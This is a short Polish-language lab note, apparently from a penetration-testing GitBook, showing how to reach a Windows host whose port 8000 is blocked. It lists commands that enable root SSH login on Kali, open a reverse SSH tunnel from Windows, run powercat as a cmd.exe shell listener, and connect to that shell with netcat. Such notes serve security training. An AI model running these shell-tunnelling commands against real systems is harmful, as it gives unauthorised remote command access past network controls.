---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# T3 - zablokowany port 8000

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (3).jpg" alt=""><figcaption></figcaption></figure>

</div>

**Kali** 10.20.10.31

```python
service ssh start

#jeśli zalogowany jako root to trzeba edytować plik
vim /etc/ssh/sshd_config
PermitRootLogin yes
```

**Win** bez serwera ssh 10.20.10.4

```python
ssh -R 4555:10.20.10.4:8000 kali@10.20.10.31

powercat -l -p 8000 -e cmd -t 360
```

**Kali** 10.20.10.31

```python
nc localhost 4555
#i mamy shella
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (4).jpg" alt=""><figcaption></figcaption></figure>

</div>
